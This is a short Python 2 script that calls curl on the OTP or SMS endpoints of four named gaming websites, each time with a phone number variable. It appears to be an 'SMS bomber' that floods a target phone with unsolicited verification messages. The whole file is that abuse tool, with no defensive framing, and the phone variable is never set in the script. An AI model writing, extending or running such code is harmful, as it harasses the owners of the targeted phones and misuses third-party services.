import os
result = os.popen("curl http://thespartanpoker.com/smsc?PHONE=$phonen").read()
print result
result = os.popen("curl http://chipbazar.com/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
print result
result = os.popen("curl http://callingstation.in/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
print result
result = os.popen("curl http://52redrummy.com/SendOTP.asp?For=Phone&PhoneNo=$phonen").read()
print result
